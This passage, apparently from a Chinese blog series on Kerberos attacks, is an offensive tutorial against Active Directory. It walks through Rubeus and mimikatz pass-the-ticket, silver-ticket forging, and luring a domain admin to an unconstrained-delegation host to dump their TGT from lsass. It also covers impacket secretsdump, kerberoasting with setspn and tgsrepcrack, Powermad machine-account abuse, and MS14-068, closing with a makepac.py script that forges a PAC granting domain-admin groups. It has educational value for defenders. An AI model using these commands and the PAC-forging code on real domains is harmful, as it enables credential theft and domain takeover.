<p>提取完之后是base64，可以利用powershell 导出为kirbi格式的文件(注意回车换行，然后就可以使用mimikatz的ptt，rubeus的ptt，或者转化为ccache使用impacket的ptt都可以，然后rubeusde ptt是支持base64的)</p>
<ul>
<li>s4u</li>
</ul>
<p>rubeus的s4u支持一条命令发起一个约束委派的流程</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012577dccea165c748.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fe9636d3d9a01420.png"></p>
<h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul>
<li>kerberos::golden</li>
</ul>
<p>mimikatz的kerberos::golden模块可以用于制作白银票据,票据格式是.kirbi</p>
<p>利用已知的服务账号的密码(如通过kerberosting)计算出hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f3c6f0fe78e2630d.png"></p>
<p>获取sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017c447de7a6e799a6.png"></p>
<p>制作白银票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dd56fa41a8bdee0a.png"></p>
<ul>
<li>kerberos::ptt</li>
</ul>
<p>mimikatz的kerberos::ptt 模块可以用于 pass the ticket</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01299c5b710f1c8067.png"></p>
<ul>
<li>sekurlsa::tickets</li>
</ul>
<p>kerberos 的sekurlsa::tickets 可用于导出票据</p>
<p>对于非约束委派，使用mimikatz利用如下</p>
<ol>
<li>通过adfind 寻找具有非约束委派的机子</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cc7a71b30fed28e8.png"></p>
<ol start="2">
<li>打下jackson-PC</li>
</ol>
<p>然后使用钓鱼或者打印机哪个漏洞，诱导域管过来访问jackson-PC</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01292ba36d2d5bccab.png"></p>
<ol start="3">
<li>在jackson-PC使用mimikatz 导出域管的TGT(因为要从lsass里面导出来，所以需要本机管理员的权限)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0113b6204fe9e75284.png"></p>
<ol start="4">
<li>ptt</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f57886a07c6ecdc.png"></p>
<h4 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h4><p>在impakcet里面很多程序都支持pass the key,只需要</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/path/to/ccache/file</span><br></pre></td></tr></table></figure>

<p>然后在需要<code>pass the key</code>的程序里面加<code>-k -no-pass</code>就行。<br>以<code>secretsdump.py</code>为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0162be326ffab71b35.png"></p>
<p>Impact 里面跟TGT_REQ相关的脚本主要有3个。</p>
<ul>
<li>getST.py</li>
</ul>
<p>在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014941e8541eb8cf06.png"></p>
<ul>
<li>GetUserSPNs.py</li>
</ul>
<p>此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。输出与JtR和HashCat兼容。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01952d728b204b69b4.png"></p>
<ul>
<li>ticketer.py</li>
</ul>
<p>该脚本将从零开始或基于模板（从KDC合法请求）创建Golden &#x2F; Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是ccache.</p>
<p>利用已知的服务账号的密码(如通过kerberosting)计算出hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f3c6f0fe78e2630d.png"></p>
<p>获取域的sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01413b1909ef9d4ce8.png"></p>
<p>制作白银票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015c9009579c1d7b29.png"></p>
<p>在使用白银票据进行 传递的时候会出现KRB_AP_ERR_MODIFIED(Message stream modified)，尚未解决</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019a3a9ea086b7bd11.png"></p>
<h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a><a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">kerberoast</a></h4><p>Kerberoast是用于攻击MS Kerberos实现的一系列工具</p>
<p>用系统内置的工具setspn提取出所有的spn</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; setspn  -Q */*</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f003f5f857bdd2cb.png"></p>
<p>请求票据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">&quot;MSSQLSvc/sqlserver.jmu.com:1433&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c1f0c07ad7c7bfaf.png"></p>
<p>从 Mimikatz 里面提取票据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="meta"># kerberos::list /export</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b21ff179db9489ca.png"></p>
<p>使用 tgsrepcrack 爆破票据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack.py wordlist.txt <span class="number">1</span>-MSSQLSvc~sql01.medin.local~<span class="number">1433</span>-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011de1f3aeba729ddc.png"></p>
<h4 id="Powermad"><a href="#Powermad" class="headerlink" title="Powermad"></a>Powermad</h4><p>默认的Active Directory ms-DS-MachineAccountQuota属性设置允许所有域用户向一个域中最多添加10个计算机帐户。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cb55e59c44f6a4ba.png"></p>
<p>Powermad包括一组用于利用ms-DS-MachineAccountQuota的功能，而无需将实际系统附加到AD。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0136f6e3bda0c4feba.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d0e323aada689d68.png"></p>
<p>这个时候的账户还没有在DNS服务器里面注册</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a6d224249922b744.png"></p>
<p>添加个DNS记录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0127cb3685282cd7c0.png"></p>
<h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>这是kerbreos篇的最后一篇文章了。这篇文章主要讲的内容是微软为了访问控制而引进的一个扩展PAC，以及PAC在历史上出现过的一个严重的，允许普通用户提升到域管的漏洞MS14068。</p>
<h3 id="PAC-介绍"><a href="#PAC-介绍" class="headerlink" title="PAC 介绍"></a>PAC 介绍</h3><p>网上很多版本的kerberos的流程是</p>
<ol>
<li>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</li>
<li>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</li>
<li>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</li>
</ol>
<p>上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p>
<p>为了解决上面的这个问题，微软引进了PAC，引进PAC之后的kerberos流程变成</p>
<ol>
<li>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<code>TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</code></li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011f9cbcb54713d1b6.png"></p>
<ol start="2">
<li><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(<code>这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据</code>，具体内容可以参考TGSREQ&amp;TGSREP，也就是上一节)</p>
</li>
<li><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）就允许用户访问。</p>
</li>
</ol>
<blockquote>
<p>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</p>
</blockquote>
<h3 id="PAC结构"><a href="#PAC结构" class="headerlink" title="PAC结构"></a>PAC结构</h3><p>PAC的结构如下图所示。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage001.png"></p>
<p>PAC整体的结构上是一个AuthorizationData的结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">              ad-type         [<span class="number">0</span>] Int32,</span><br><span class="line">              ad-data         [<span class="number">1</span>] OCTET STRING</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>AuthorizationData结构的ad-type主要有以下几个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AD-IF-RELEVANT                     <span class="number">1</span></span><br><span class="line">AD-INTENDED-FOR-SERVER             <span class="number">2</span></span><br><span class="line">AD-INTENDED-FOR-APPLICATION-CLASS  <span class="number">3</span></span><br><span class="line">AD-KDC-ISSUED                      <span class="number">4</span></span><br><span class="line">AD-AND-OR                          <span class="number">5</span></span><br><span class="line">AD-MANDATORY-TICKET-EXTENSIONS     <span class="number">6</span></span><br><span class="line">AD-IN-TICKET-EXTENSIONS            <span class="number">7</span></span><br><span class="line">AD-MANDATORY-FOR-KDC               <span class="number">8</span></span><br><span class="line">Reserved values                 <span class="number">9</span><span class="number">-63</span></span><br><span class="line">OSF-DCE                           <span class="number">64</span></span><br><span class="line">SESAME                            <span class="number">65</span></span><br><span class="line">AD-OSF-DCE-PKI-CERTID             <span class="number">66</span> (hemsath @us.ibm.com)</span><br><span class="line">AD-WIN2K-PAC                     <span class="number">128</span> (jbrezak @exchange.microsoft.com)</span><br><span class="line">AD-ETYPE-NEGOTIATION             <span class="number">129</span>  (lzhu @windows.microsoft.com)</span><br></pre></td></tr></table></figure>

<p>如上图所示，整个PAC最外层的ad-type为AD-IF-RELEVANT，ad-data还是一个AuthorizationData结构。</p>
<p>这个AuthorizationData的ad-type 为AD-WIN2K-PAC，ad-data为一段连续的空间，</p>
<p>这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER</p>
<p>头部PACTYPE包括cBuffers,版本以及缓冲区，PAC_INFO_BUFFER为key-value型的</p>
<p>key 的类型如下表所示</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0x00000001</td>
<td align="left">登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x00000002</td>
<td align="left">凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>
</tr>
<tr>
<td align="left">0x00000006</td>
<td align="left">服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x00000007</td>
<td align="left">KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000A</td>
<td align="left">客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000B</td>
<td align="left">受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000C</td>
<td align="left">用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>
</tr>
<tr>
<td align="left">0x0000000D</td>
<td align="left">客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000E</td>
<td align="left">设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000F</td>
<td align="left">设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>
</tr>
</tbody></table>
<p>下面详细介绍四个比较重要的</p>
<ul>
<li>0x00000001   KERB_VALIDATION_INFO</li>
</ul>
<p>这个结构是登录信息，也是整个PAC最重要的部分，整个PAC就靠它来验证用户身份了，是个结构体，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KERB_VALIDATION_INFO</span> &#123;</span></span><br><span class="line">   FILETIME LogonTime;</span><br><span class="line">   FILETIME LogoffTime;</span><br><span class="line">   FILETIME KickOffTime;</span><br><span class="line">   FILETIME PasswordLastSet;</span><br><span class="line">   FILETIME PasswordCanChange;</span><br><span class="line">   FILETIME PasswordMustChange;</span><br><span class="line">   RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">   RPC_UNICODE_STRING FullName;</span><br><span class="line">   RPC_UNICODE_STRING LogonScript;</span><br><span class="line">   RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">   USHORT LogonCount;</span><br><span class="line">   USHORT BadPasswordCount;</span><br><span class="line">   ULONG UserId; <span class="comment">//用户的sid</span></span><br><span class="line">   ULONG PrimaryGroupId; </span><br><span class="line">   ULONG GroupCount;</span><br><span class="line">   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;<span class="comment">//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span></span><br><span class="line">   ULONG UserFlags;</span><br><span class="line">   USER_SESSION_KEY UserSessionKey;</span><br><span class="line">   RPC_UNICODE_STRING LogonServer;</span><br><span class="line">   RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">   PISID LogonDomainId;</span><br><span class="line">   ULONG Reserved1[<span class="number">2</span>];</span><br><span class="line">   ULONG UserAccountControl;</span><br><span class="line">   ULONG SubAuthStatus;</span><br><span class="line">   FILETIME LastSuccessfulILogon;</span><br><span class="line">   FILETIME LastFailedILogon;</span><br><span class="line">   ULONG FailedILogonCount;</span><br><span class="line">   ULONG Reserved3;</span><br><span class="line">   ULONG SidCount;</span><br><span class="line">   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">   PISID ResourceGroupDomainSid;</span><br><span class="line">   ULONG ResourceGroupCount;</span><br><span class="line">   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>0x0000000A PAC_CLIENT_INFO</p>
</li>
<li><p>客户端Id（8个字节）：<br>包含在Kerberos初始TGT的authtime</p>
</li>
<li><p>NameLength（2字节）<br>用于指定Name 字段的长度（以字节为单位）。</p>
</li>
<li><p>Name<br>包含客户帐户名的16位Unicode字符数组，格式为低端字节序。</p>
</li>
<li><p>0x00000006和0x00000007 0x00000006 对应的是服务检验和，0x00000007 对应的是KDC校验和。分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。<br>存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。<br>两个都是PAC_SIGNATURE_DATA结构，他包括以下结构。 1. SignatureType（4个字节）</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">含义</th>
<th align="left">签名长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0xFFFFFF76</td>
<td align="left">KERB_CHECKSUM_HMAC_MD5</td>
<td align="left">16</td>
</tr>
<tr>
<td align="left">0x0000000F</td>
<td align="left">HMAC_SHA1_96_AES128</td>
<td align="left">12</td>
</tr>
<tr>
<td align="left">0x00000010</td>
<td align="left">HMAC_SHA1_96_AES256</td>
<td align="left">12</td>
</tr>
</tbody></table>
<ol>
<li>Signature<br>包含校验和。签名的长度由SignatureType字段的值确定 3. RODCIdentifier（2个字节）：<br>当KDC为RODC时，包含密钥版本号的前16位。当KDC不是RODC时，此字段不存在。</li>
</ol>
<h3 id="相关安全问题"><a href="#相关安全问题" class="headerlink" title="相关安全问题"></a>相关安全问题</h3><ol>
<li>MS14068<br>补丁编号是KB3011780，域里面最严重的漏洞之一，它允许任意用户提升到域管权限。下面简要分析下该漏洞。</li>
</ol>
<p>该漏洞最本质的地方在于Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名，这里面的签名就是上面提到的服务检验和以及KDC校验和。导致用户可以自己构造一张PAC。 签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC 进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5 给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。</p>
<p>在KERB_VALIDATION_INFO结构里面，我们看到有这两个字段。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0126de90d449af1445.png"></p>
<p>其中GroupId是用户所在所在的组，那只要我们把重要组(比如域管组)的sid加进GroupId。那么服务拿这用户的TGS去询问域管用户是否有访问访问改服务的权限的时候，域控会解密PAC，提取里面用户的sid，以及所在的组(GroupId)，我们已经把域管加进去了，是的域控把把这个用户当做域管组里面的成员。从而达到提升为域管的效果。pykek加入的是以下组,</p>
<ul>
<li>域用户（513）</li>
<li>域管理员（512）</li>
<li>架构管理员（518）</li>
<li>企业管理员（519）</li>
<li>组策略创建者所有者（520）</li>
</ul>
<p>现在我们已经能够伪造pac,将我们放在域管的组里，然后伪造检验和。但是即使用户可以伪造PAC。该漏洞的利用依旧还有一个棘手的问题。 前面我们说过。PAC是包含在TGT里面的,而TGT是krbtgt的用户hash加密的，也就意味着即使我们可以伪造PAC，那我们有什么办法讲PAC放在票据里面传输给KDC呢。漏洞的作者用了一个很巧妙的方式。通过查看pykek的源码发现， 作者将PAC加密成密文放在enc-authorization-data里面，enc-authorization-data的结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AuthorizationData::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">   ad-type[<span class="number">0</span>] Int32,</span><br><span class="line">   ad-data[<span class="number">1</span>] OCTET STRING</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ad-type是加密算法 ad-data是pac加密后的内容 加密用的key是客户端生成的。KDC并不知道这个key。KDC会从PA-DATA里面的AP_REQ获取到这个key。从而对ad-data进行解密，然后拿到PAC，再检查校验和。 可能很多人抓包,在AP_REQ里面并没有找到这个key。在上一篇文章里面对于AP_REQ介绍得不多。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ed2dbaa28ada4357.png"></p>
<p>只是说了TGT票据就放在这个结构体里面。这里补充介绍下。 AP_REQ的type是PADATA_TYPE.AP_REQ(INTEGER 1)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0124ad34409cf6eee2.png"></p>
<p>value是如下结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AP-REQ  ::= [APPLICATION <span class="number">14</span>] SEQUENCE &#123;</span><br><span class="line">        pvno            [<span class="number">0</span>] INTEGER (<span class="number">5</span>),</span><br><span class="line">        msg-type        [<span class="number">1</span>] INTEGER (<span class="number">14</span>),</span><br><span class="line">        ap-options      [<span class="number">2</span>] APOptions,</span><br><span class="line">        ticket          [<span class="number">3</span>] Ticket,</span><br><span class="line">        authenticator   [<span class="number">4</span>] EncryptedData -- Authenticator</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之前说的TGT票据放在这个结构体里面，就是放在ticket里面。 authenticator 的内容包括加密类型和用session_key加密Authenticator加密成的密文。 Authenticator的结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Authenticator ::= [APPLICATION <span class="number">2</span>] SEQUENCE  &#123;</span><br><span class="line">     authenticator-vno       [<span class="number">0</span>] INTEGER (<span class="number">5</span>),</span><br><span class="line">     crealm                  [<span class="number">1</span>] Realm,</span><br><span class="line">     cname                   [<span class="number">2</span>] PrincipalName,</span><br><span class="line">     cksum                   [<span class="number">3</span>] Checksum OPTIONAL,</span><br><span class="line">     cusec                   [<span class="number">4</span>] Microseconds,</span><br><span class="line">     ctime                   [<span class="number">5</span>] KerberosTime,</span><br><span class="line">     subkey                  [<span class="number">6</span>] EncryptionKey OPTIONAL,</span><br><span class="line">     seq-number              [<span class="number">7</span>] UInt32 OPTIONAL,</span><br><span class="line">     authorization-data      [<span class="number">8</span>] AuthorizationData OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中加密PAC的密钥就放在subkey里面。 大体流程就是KDC拿到AP_REQ之后，提取里面authenticator的密文，用session_key解密获得subkey，再使用subkey解密enc-authorization-data获得PAC.而PAC是我们自己伪造的.</p>
<p>所以最后梳理一下MS14068漏洞利用思路。</p>
<ol>
<li>发起一个 PA_PAC_REQUEST里面选择include_pac 为false。此时生成的TGT票据是不含有PAC的</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ddb9fad9c10304d7.png"></p>
<ol start="2">
<li>伪造一个PAC。sid为当前用户的sid。将如下组的 sid加进GroupId</li>
</ol>
<ul>
<li>域用户（513）</li>
<li>域管理员（512）</li>
<li>架构管理员（518）</li>
<li>企业管理员（519）</li>
<li>组策略创建者所有者（520）</li>
</ul>
<p>后续kerberos测试工具会加入制作PAC的功能，现在暂时不支持，我们直接利用pykek的代码来生成下，跟ms14068.py的同一文件夹底下，新建makepac.py,代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from kek.pac import build_pac</span><br><span class="line">from kek.util import  gt2epoch</span><br><span class="line">from kek.krb5 import AD_WIN2K_PAC,AuthorizationData,AD_IF_RELEVANT</span><br><span class="line">from pyasn1.codec.der.encoder import encode</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user_realm = <span class="string">&quot;0day.org&quot;</span> #改成自己的</span><br><span class="line">    user_name = <span class="string">&quot;jack&quot;</span> #改成自己的</span><br><span class="line">    user_sid = <span class="string">&quot;S-1-5-21-1812960810-2335050734-3517558805-1133&quot;</span> #改成自己的</span><br><span class="line">    # logon_time = gt2epoch(str(as_rep_enc[<span class="string">&#x27;authtime&#x27;</span>]))</span><br><span class="line">    logon_time = gt2epoch(<span class="string">&#x27;20191112101422Z&#x27;</span>)</span><br><span class="line">    print(logon_time)</span><br><span class="line">    authorization_data = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))</span><br><span class="line">    ad1 = AuthorizationData()</span><br><span class="line">    ad1[<span class="number">0</span>] = None</span><br><span class="line">    ad1[<span class="number">0</span>][<span class="string">&#x27;ad-type&#x27;</span>] = authorization_data[<span class="number">0</span>]</span><br><span class="line">    ad1[<span class="number">0</span>][<span class="string">&#x27;ad-data&#x27;</span>] = authorization_data[<span class="number">1</span>]</span><br><span class="line">    ad = AuthorizationData()</span><br><span class="line">    ad[<span class="number">0</span>] = None</span><br><span class="line">    ad[<span class="number">0</span>][<span class="string">&#x27;ad-type&#x27;</span>] = AD_IF_RELEVANT</span><br><span class="line">    ad[<span class="number">0</span>][<span class="string">&#x27;ad-data&#x27;</span>] = encode(ad1)</span><br><span class="line">    data =  encode(ad)</span><br><span class="line">    with open(<span class="string">&quot;jack.pac&quot;</span>,<span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">        f.write(data)</span><br></pre></td></tr></table></figure>

